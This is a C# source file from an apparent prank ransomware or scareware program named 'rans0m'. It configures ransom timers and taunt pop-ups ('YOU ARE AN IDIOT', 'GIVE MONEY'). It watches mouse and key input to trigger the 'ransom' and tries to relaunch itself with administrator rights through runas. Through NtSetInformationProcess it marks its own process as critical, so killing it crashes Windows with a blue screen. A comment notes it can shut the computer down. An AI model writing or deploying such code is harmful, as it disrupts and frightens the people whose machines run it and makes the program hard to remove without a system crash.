using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace rans0m
{
    public class Global
    {
        // ----------------------------- CONFIGURATION -----------------------------
        public static readonly int minRansomTime = 30; // In seconds
        public static readonly int maxRansomTime = 10*60; // In seconds

        // Titles used by the pop up windows
        public static readonly List<string> tauntTitles = new() {
            "RANS0M",
            "MOSNAR",
            "RANSOM",
            "M0NARS",
            "YOU ARE AN IDIOT",
            "Untitled",
            "Untitled (3)",
            "I FOUND YOU",
            "RANSOM.exe",
            "RAANNNSSSSOOOOOMMMMMM",
            "times up",
            "GIVE MONEY",
            "ERROR",
            "DHAUFGH",
            "_________"
        };

        // Images used by the pop up windows
        public static readonly List<Bitmap> tauntImages = new() {
            Properties.Resources.glitch,
            Properties.Resources.idiot,
            Properties.Resources.ransom_idle,
            Properties.Resources.ransom_random,
            Properties.Resources.stop_sign,
            Properties.Resources.static1,
            Properties.Resources.taunt2,
            Properties.Resources.taunt3,
        };





        // -------------------------- GLOBAL VARIABLES --------------------------

        public static int ransomLeft = 0;
        public static bool underRansom = false;
        public static Action? RansomPayed;
        public static List<string> usedCoins = new();
        public static bool canAttack = true;
        public static Point lastRegisteredMousePos;
        public static bool spyingMouse = false;

        public static Random rng = new Random();
        public static Rectangle screenBounds = Screen.PrimaryScreen.WorkingArea;


        




        // -------------------------- PUBLIC METHODS --------------------------

        public static void KeyPressed(Keys key)
        { 
            if (spyingMouse) {
                lastRegisteredMousePos = new Point(-1, -1); // Invalidate the last registered mouse position if a key is pressed during the spy phase so it also triggers the ransom
            }
        }

        /// <returns>true if the application is started as administrator</returns>
        public static bool IsAdministrator()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        /// <summary>
        /// Tries to restart the process as admin
        /// </summary>
        public static void AttemptForceAdmin()
        {
            if (!Global.IsAdministrator()) // If process not ran as admin
            {
                try
                {
                    var proc = new Process
                    {
                        StartInfo =
                    {
                        FileName = Process.GetCurrentProcess().MainModule.FileName,
                        UseShellExecute = true,
                        Verb = "runas"
                    }
                    };

                    proc.Start(); // Start new process as admin
                    Process.GetCurrentProcess().Kill(); // Kill current process
                }
                catch {
                    //MessageBox.Show("RANS0M requires admin privileges.", "RANS0M");
                    //Process.GetCurrentProcess().Kill(); // Kill process
                    // Not forcing admin anymore since I can just shutdown the computer without admin privileges
                }
            }
        }

        /// <summary>
        /// Transforms the process into a critical process, which will cause a BSOD if it is killed
        /// </summary>
        public static void IntoCriticalProcess()
        {
            [DllImport("ntdll.dll", SetLastError = true)]
            static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
            int isCritical = 1;
            int BreakOnTermination = 0x1D;  // flag BreakOnTermination
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        /// <summary>
        /// Randomly positions a control within the screen bounds.
        /// </summary>
        public static void RandomPosControl(Control control)
        {
            int x = Global.rng.Next(0, Global.screenBounds.Width - control.Width);
            int y = Global.rng.Next(0, Global.screenBounds.Height - control.Height);

            control.Location = new Point(x, y);
        }

        /// <summary>
        /// Centers a control within the screen bounds.
        /// </summary>
        public static void CenterControl(Control control)
        {
            control.Location = new Point((Global.screenBounds.Width / 2) - control.Width / 2, (Global.screenBounds.Height / 2) - control.Height / 2);
        }

        /// <summary>
        /// Cool glitch idle animation, used for the ransom pop ups
        /// </summary>
        public async static void GlitchIdle(Control control, bool divideAndTaunt=false)
        {
            int x = control.Location.X;
            int y = control.Location.Y;

            while (!control.IsDisposed)
            {
                await Task.Delay(200);
                if (control.IsDisposed) break;

                try
                {
                    if (!Global.underRansom)
                    {
                        control.Invoke(() => control.Dispose());
                        break;
                    }

                    control.Invoke((MethodInvoker)delegate
                    {
                        if (divideAndTaunt)
                        {
                            if (Global.rng.Next(1, 100) <= 2) // 2% chance that the control teleports somewhere else and spawns a TauntWindow
                            {
                                x = Global.rng.Next(0, Global.screenBounds.Width - control.Width);
                                y = Global.rng.Next(0, Global.screenBounds.Height - control.Height);

                                TauntWindow tauntWindow = new TauntWindow();
                                tauntWindow.Show();
                            }
                        }

                        // Sets random position
                        control.Location = new Point(x + Global.rng.Next(-5, 5), y + Global.rng.Next(-5, 5));
                    });
                }
                catch { break; }
            }
        }

    }
}
